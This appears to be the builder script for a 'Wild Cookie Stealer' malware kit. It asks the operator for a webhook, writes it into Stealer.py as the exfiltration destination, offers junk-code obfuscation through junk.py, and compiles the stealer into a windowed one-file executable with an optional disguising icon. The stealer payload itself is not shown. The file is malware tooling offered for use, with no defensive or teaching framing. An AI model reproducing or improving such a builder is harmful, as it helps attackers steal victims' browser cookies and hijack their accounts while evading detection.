from pystyle import *
import os
import subprocess
from colorama import *
import time
from tkinter import filedialog, Tk

os.system('clear' if os.name == 'posix' else 'cls')

intro = """
                                                              
                      ▒▒██▓▓  ░░░░░░░░░░░░████░░                    
                    ▒▒▒▒▒▒▓▓██▓▓▓▓▓▓▓▓████▓▓▒▒▓▓░░                  
                  ▓▓▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▓▓░░                
                  ██▒▒▓▓▓▓██▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒░░                
                  ██▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓██▒▒▒▒                
                  ░░▓▓▓▓▒▒▒▒▒▒░░░░▒▒▒▒░░▒▒▒▒▒▒██▓▓░░                
                  ██▒▒▓▓▒▒▒▒▒▒    ░░▒▒    ▒▒▒▒██▒▒▒▒                
                ▒▒▒▒▒▒▓▓▓▓▒▒░░░░      ▓▓    ▒▒▒▒▒▒▓▓                
                ▒▒▒▒▒▒▒▒▓▓░░░░░░      ▓▓  ░░▓▓▒▒▒▒▓▓      Wild Cookie Stealer - o_0
                  ▓▓▒▒▒▒▒▒▓▓          ░░  ▓▓▒▒▒▒▒▒▒▒                
                    ██▒▒▓▓  ██████░░██████░░▓▓▒▒▓▓                  
                    ██▒▒██    ▓▓▓▓▓▓██▒▒  ░░▓▓▒▒▓▓                  
                    ░░▓▓▓▓▒▒░░▒▒▒▒▓▓░░▓▓  ▓▓▒▒██░░                  
                      ▒▒▓▓██░░██▓▓██████  ▓▓▓▓                      
                      ▓▓▓▓    ▒▒▓▓▓▓▓▓    ░░▓▓▓▓                    
                      ░░                    ░░                      
                                                                                              


"""

Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interval=0.035, enter=True)



print(f"""{Fore.LIGHTRED_EX}
                                                              
                      ▒▒██▓▓  ░░░░░░░░░░░░████░░                    
                    ▒▒▒▒▒▒▓▓██▓▓▓▓▓▓▓▓████▓▓▒▒▓▓░░                  
                  ▓▓▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▓▓░░                
                  ██▒▒▓▓▓▓██▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒░░                
                  ██▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓██▒▒▒▒                
                  ░░▓▓▓▓▒▒▒▒▒▒░░░░▒▒▒▒░░▒▒▒▒▒▒██▓▓░░                
                  ██▒▒▓▓▒▒▒▒▒▒    ░░▒▒    ▒▒▒▒██▒▒▒▒                
                ▒▒▒▒▒▒▓▓▓▓▒▒░░░░      ▓▓    ▒▒▒▒▒▒▓▓                
                ▒▒▒▒▒▒▒▒▓▓░░░░░░      ▓▓  ░░▓▓▒▒▒▒▓▓      Wild Cookie Stealer - o_0
                  ▓▓▒▒▒▒▒▒▓▓          ░░  ▓▓▒▒▒▒▒▒▒▒                
                    ██▒▒▓▓  ██████░░██████░░▓▓▒▒▓▓                  
                    ██▒▒██    ▓▓▓▓▓▓██▒▒  ░░▓▓▒▒▓▓                  
                    ░░▓▓▓▓▒▒░░▒▒▒▒▓▓░░▓▓  ▓▓▒▒██░░                  
                      ▒▒▓▓██░░██▓▓██████  ▓▓▓▓                      
                      ▓▓▓▓    ▒▒▓▓▓▓▓▓    ░░▓▓▓▓                    
                      ░░                    ░░                      
                                                                                              

""")

time.sleep(1)


while True:
    Write.Print("\nWhat do you want to choice | 1/2", Colors.purple_to_yellow)
    Write.Print("\n1. Build an executable", Colors.purple_to_yellow)
    Write.Print("\n2. Close", Colors.purple_to_yellow)
    Write.Print("\nselect: ", Colors.purple_to_yellow, end="")
    choice = input()

    if choice == "1":
        os.system("cls || clear")
        webhook = input(Fore.CYAN + "\nEnter Your Webhook: " + Style.RESET_ALL)

        filename = "Stealer.py"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        new_content = content.replace('"0WebhookHere0"', f'"{webhook}"')
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
        Write.Print(f"\n{filename} file updated.", Colors.purple_to_yellow)

        obfuscate = False
        while True:
            answer = input(Fore.CYAN + "\nDo you want to junk your code? | (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                os.system("python junk.py")
                Write.Print(f"\n{filename} The file has been junked.", Colors.purple_to_yellow)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nYou have entered invalid. Please try again.", Colors.purple_to_yellow)

        answer = input(Fore.CYAN + "\nDo you want to make exe file? | (Y/N) " + Style.RESET_ALL)
        if answer.upper() == "Y":
            answer = input(Fore.CYAN + "\nDo you want to add an icon? | (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                Tk().withdraw()  
                icon_file = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")])
                if icon_file:
                    subprocess.call(["pyinstaller", "--onefile", "--windowed", "--icon", icon_file, filename])
                    Write.Print(f"\n{filename} has been converted to exe with the selected icon.", Colors.purple_to_yellow)
                else:
                    Write.Print("\nThe file you choose must have .ico extension!", Colors.purple_to_yellow)
            else:
                subprocess.call(["pyinstaller", "--onefile", "--windowed", filename])
                Write.Print(f"\n{filename} The file has been converted to exe.", Colors.purple_to_yellow)

    elif choice == "2":
        Write.Print("\nExiting the program...", Colors.purple_to_yellow)
        break

    else:
        Write.Print("\nWhoops! Something went wrong... 0_o", Colors.purple_to_yellow)
